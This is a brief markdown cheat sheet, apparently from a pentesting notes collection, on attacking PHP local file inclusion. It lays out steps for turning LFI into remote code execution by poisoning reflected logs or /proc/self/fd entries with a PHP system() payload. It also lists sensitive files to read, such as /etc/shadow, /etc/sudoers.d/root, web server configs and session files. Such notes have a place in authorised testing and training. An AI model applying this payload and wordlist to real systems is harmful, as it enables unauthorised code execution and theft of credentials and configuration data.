# Web Local File Inlucsion (LFI)

- [LCE To RCE](#lce-to-rce)
- [Wordlist](#wordlist)
- [References](#references)


## LCE To RCE

### PHP

```
[Encounter #1]

* First try to LFI on /proc/self/fd/<number> with number from 0 to 100.
* Example => /proc/self/fd/0 @ /proc/self/fd/1 @ /proc/self/fd/100
* If you found any parameter that reflected on this log 
* Try to put <?php system('<command>'); ?>
* Example => user_ref=<?php system('id'); ?>
* Then try to go back to that file and if it works you can see the output :)
```


## Wordlist

```
/etc/knockd.conf
/etc/shadow
/etc/passwd
/etc/sudoers.d/root
/etc/php/apache2/php.ini
/etc/nginx/sites-enabled/default.conf
/etc/ningx/nginx.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/php.ini
/var/log/auth
/var/log/apache2/error.log
/var/log/apache2/access.log
/var/www/logs/access_log
/var/www/logs/error_log
/var/lib/php5/sess_<your session>
/proc/self/fd/<number loop 0-100>
```

# References

